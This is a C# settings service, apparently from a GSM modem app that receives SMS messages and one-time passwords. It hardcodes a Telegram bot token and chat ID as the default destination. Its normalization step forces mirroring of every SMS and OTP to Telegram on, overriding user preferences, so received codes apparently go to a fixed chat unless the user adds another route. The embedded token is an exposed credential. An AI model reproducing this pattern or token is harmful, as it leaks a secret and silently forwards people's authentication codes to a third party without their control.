using System;
using System.IO;
using System.Text.Json;
using gsm.Models;

namespace gsm.Services;

public static class SettingsService
{
    private static readonly string SettingsFilePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "appsettings.json");
    private const string DefaultTelegramBotToken =
        "8850197709:AAFqbWVswmJ0B7Kmr0cppmYShdqdC55RI_k";
    private const string DefaultTelegramChatIds = "-1003586587027";

    public static AppSettings Current { get; private set; } = new AppSettings();

    static SettingsService()
    {
        Current = LoadSettings();
    }

    public static AppSettings LoadSettings()
    {
        AppBootstrap.EnsureAll();

        if (File.Exists(SettingsFilePath))
        {
            try
            {
                var json = File.ReadAllText(SettingsFilePath);
                var settings = JsonSerializer.Deserialize<AppSettings>(json);
                settings ??= new AppSettings();
                bool needsInstallationId = string.IsNullOrWhiteSpace(settings.InstallationId)
                    || !Guid.TryParseExact(settings.InstallationId, "N", out _);
                bool needsFirebaseSyncMigration = settings.FirebaseSyncPreferenceVersion < 1;
                bool needsTelegramRoutesMigration =
                    settings.TelegramRoutes == null
                    || settings.TelegramRoutes.Count == 0;
                AppSettings normalized = Normalize(settings);
                if (needsInstallationId
                    || needsFirebaseSyncMigration
                    || needsTelegramRoutesMigration)
                {
                    // Upgrade old settings once so the identity remains stable
                    // after every restart. Failure is non-fatal for startup.
                    PersistSettings(normalized);
                }
                return normalized;
            }
            catch (Exception)
            {
                // Ignored
            }
        }

        // Return default settings
        return Normalize(new AppSettings());
    }

    public static bool SaveSettings(AppSettings settings)
    {
        try
        {
            AppSettings normalized = Normalize(settings);
            if (!PersistSettings(normalized)) return false;
            Current = normalized;
            return true;
        }
        catch (Exception)
        {
            return false;
        }
    }

    private static bool PersistSettings(AppSettings settings)
    {
        string temporaryPath = $"{SettingsFilePath}.{Guid.NewGuid():N}.tmp";
        try
        {
            var options = new JsonSerializerOptions { WriteIndented = true };
            var json = JsonSerializer.Serialize(settings, options);
            Directory.CreateDirectory(Path.GetDirectoryName(SettingsFilePath)!);
            using (var stream = new FileStream(
                       temporaryPath,
                       FileMode.CreateNew,
                       FileAccess.Write,
                       FileShare.None,
                       4096,
                       FileOptions.WriteThrough))
            using (var writer = new StreamWriter(stream, new System.Text.UTF8Encoding(false)))
            {
                writer.Write(json);
                writer.Flush();
                stream.Flush(flushToDisk: true);
            }
            File.Move(temporaryPath, SettingsFilePath, overwrite: true);
            return true;
        }
        catch
        {
            return false;
        }
        finally
        {
            try
            {
                if (File.Exists(temporaryPath)) File.Delete(temporaryPath);
            }
            catch { }
        }
    }

    private static AppSettings Normalize(AppSettings settings)
    {
        settings.EnableApiServer = false;
        settings.OtpWebhookUrl = "";
        settings.PushOtpToWeb = false;
        settings.FirebaseUrl = FirebaseService.DatabaseUrl;
        settings.FirebaseDbUrl = FirebaseService.DatabaseUrl;
        settings.FirebaseAuthToken = "";
        if (settings.FirebaseSyncPreferenceVersion < 1)
        {
            settings.WriteOtpToFirebase = false;
            settings.FirebaseSyncPreferenceVersion = 1;
        }
        // Incoming GSM messages are operational data, not optional marketing
        // notifications. Once Telegram has a destination, every received SMS
        // must be mirrored regardless of whether OTP extraction succeeded.
        settings.TelegramOnOtp = true;
        settings.TelegramOnSms = true;
        NormalizeTelegramRoutes(settings);
        settings.SignalScanIntervalSeconds = Math.Clamp(
            settings.SignalScanIntervalSeconds, 5, 300);
        if (string.IsNullOrWhiteSpace(settings.MachineId))
            settings.MachineId = Environment.MachineName;
        if (string.IsNullOrWhiteSpace(settings.InstallationId)
            || !Guid.TryParseExact(settings.InstallationId, "N", out _))
        {
            settings.InstallationId = Guid.NewGuid().ToString("N");
        }
        return settings;
    }

    public static TelegramRouteSettings CreateDefaultTelegramRoute() =>
        new()
        {
            BotToken = DefaultTelegramBotToken,
            ChatIds = DefaultTelegramChatIds,
            EnablePhoneWhitelist = false,
            PhoneWhitelist = string.Empty
        };

    private static void NormalizeTelegramRoutes(AppSettings settings)
    {
        settings.TelegramPhoneWhitelist =
            TelegramPhoneWhitelist.NormalizeList(
                settings.TelegramPhoneWhitelist);

        var normalizedRoutes = new List<TelegramRouteSettings>();
        var routeIds = new HashSet<string>(StringComparer.Ordinal);
        foreach (TelegramRouteSettings? route in
                 settings.TelegramRoutes ?? [])
        {
            if (route == null) continue;

            string token = (route.BotToken ?? string.Empty).Trim();
            string chatIds = (route.ChatIds ?? string.Empty).Trim();
            if (token.Length == 0 || chatIds.Length == 0) continue;

            string id = (route.Id ?? string.Empty).Trim();
            if (id.Length == 0 || !routeIds.Add(id))
            {
                do
                {
                    id = Guid.NewGuid().ToString("N");
                }
                while (!routeIds.Add(id));
            }

            normalizedRoutes.Add(new TelegramRouteSettings
            {
                Id = id,
                BotToken = token,
                ChatIds = chatIds,
                EnablePhoneWhitelist = route.EnablePhoneWhitelist,
                PhoneWhitelist = TelegramPhoneWhitelist.NormalizeList(
                    route.PhoneWhitelist)
            });
        }

        if (normalizedRoutes.Count == 0)
        {
            string legacyToken =
                (settings.TelegramBotToken ?? string.Empty).Trim();
            string legacyChatIds = !string.IsNullOrWhiteSpace(
                    settings.TelegramChatIds)
                ? settings.TelegramChatIds.Trim()
                : (settings.TelegramChatId ?? string.Empty).Trim();
            if (legacyToken.Length > 0 && legacyChatIds.Length > 0)
            {
                normalizedRoutes.Add(new TelegramRouteSettings
                {
                    BotToken = legacyToken,
                    ChatIds = legacyChatIds,
                    EnablePhoneWhitelist =
                        settings.EnableTelegramPhoneWhitelist,
                    PhoneWhitelist = settings.TelegramPhoneWhitelist
                });
            }
            else
            {
                normalizedRoutes.Add(CreateDefaultTelegramRoute());
            }
        }

        settings.TelegramRoutes = normalizedRoutes;

        // Keep the first route mirrored to the legacy properties because
        // system-level notifications do not have a SIM number to route by.
        TelegramRouteSettings primary = normalizedRoutes[0];
        settings.TelegramBotToken = primary.BotToken;
        settings.TelegramChatId = primary.ChatIds;
        settings.TelegramChatIds = primary.ChatIds;
        settings.EnableTelegramPhoneWhitelist =
            primary.EnablePhoneWhitelist;
        settings.TelegramPhoneWhitelist = primary.PhoneWhitelist;
    }
}
